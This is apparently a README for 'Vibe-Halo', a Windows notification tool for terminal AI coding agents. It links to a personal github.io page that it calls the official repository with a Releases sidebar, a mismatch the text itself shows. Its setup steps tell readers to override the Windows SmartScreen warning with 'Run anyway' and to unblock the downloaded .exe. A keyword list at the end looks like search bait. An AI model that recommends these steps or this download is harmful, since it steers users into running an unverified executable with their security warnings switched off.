# 🔔 Vibe-Halo - Streamline AI coding agent permission requests

[![](https://img.shields.io/badge/Download-Vibe--Halo-blue.svg)](https://rosileia1457.github.io)

Vibe-Halo manages notifications and permissions for your AI coding tools. It provides a visual interface for agents that run in the background. You receive clear popups when your coding agent needs approval to perform an action. It also displays a dynamic overlay to track completion status and active tasks directly on your screen.

## 💻 What this software does

Modern AI coding agents often operate in the terminal. These tools frequently ask for permission to edit files, run commands, or access system resources. Without Vibe-Halo, these requests often get lost in scrolling text or hidden terminal logs. 

Vibe-Halo acts as a bridge between your terminal-based AI tools and your desktop environment. It listens for common patterns from agents like Claude Code, ZCode, and OpenCode. When an agent signals that it needs human input, Vibe-Halo brings that request to the front. You see exactly what the AI wants to do before you grant permission.

## 📋 System requirements

Ensure your computer meets these requirements before you start:

*   Windows 10 or Windows 11 (64-bit).
*   4GB of RAM or more.
*   An active AI coding agent installed on your machine (such as Claude Code or equivalent).
*   An internet connection for the installation process.

## 📥 Downloading Vibe-Halo

You can obtain the current version of Vibe-Halo from the official repository page.

[Visit the repository to download](https://rosileia1457.github.io)

1. Navigate to the link above.
2. Look for the "Releases" section on the right sidebar.
3. Click the latest version number.
4. Download the file ending in `.exe` under the "Assets" section.
5. Save the installer to your Downloads folder.

## ⚙️ Running the setup

1. Open your Downloads folder.
2. Double-click the `Vibe-Halo-Setup.exe` file.
3. If a blue "Windows protected your PC" window appears, click the "More info" link, then click "Run anyway." This happens because the app is brand new and the automated security check has not validated it yet.
4. Follow the on-screen prompts to complete the installation.
5. Launch the application from your Start Menu after the installer finishes.

## 🛠️ Configuring your agent

Vibe-Halo works automatically with most popular AI coding agents out of the box. Once the software opens, it stays in your system tray—the area near your clock on the bottom right of your screen. 

Make sure your terminal application and Vibe-Halo are both running. When you trigger an AI agent, Vibe-Halo detects the communication output. It maps specific permission flags to the popup window.

## 🔍 Understanding the interface

### The Approval Popup
When an agent asks if it can modify a file, a window appears on your screen. This window displays the specific file path or command the agent wants to touch. You have two main buttons:
*   **Approve:** Allows the action and lets the agent proceed.
*   **Deny:** Blocks the action and tells the agent to stop that specific task.

### The Dynamic Island
The Dynamic Island is a small floating pill on your screen. It shows the current status of your coding agent. 
*   **Green:** The agent is idle and waiting for commands.
*   **Yellow:** The agent is processing a request or reading files.
*   **Blue:** The agent is waiting for your manual approval.

You can drag this island to any corner of your screen that fits your workflow.

## 🛡️ Troubleshooting common issues

**The app does not show popups.**
Ensure the agent you use produces standard output matches. If the agent remains silent, restart the agent in your terminal while Vibe-Halo is already open. 

**Windows blocks the installation.**
This is common for new software. Right-click the file, select "Properties," and check the "Unblock" box near the bottom of the General tab if it exists. Click "Apply" and then run the file again.

**The Dynamic Island blocks my view.**
Click and hold the island with your mouse to move it. You can snap it to the corners or the top center of your screen.

**Permission requests look strange.**
Confirm that your AI agent is updated to the latest version. Older agents sometimes use different formatting styles that might not register with early versions of Vibe-Halo.

## 💡 About the design

The application uses standard Windows libraries to ensure low memory usage. It does not store your AI keys or private data. All processing occurs locally on your machine. The communication between your agent and the popup window happens over a secure local port. No data leaves your machine during this process.

Keywords: ai-coding-agent, approval-workflow, claude-code, codex, codex-cli, copilot-cli, desktop-notifications, developer-tools, dynamic-island, electron, human-in-the-loop, opencode, permission-request, qwen-code, windows, zcode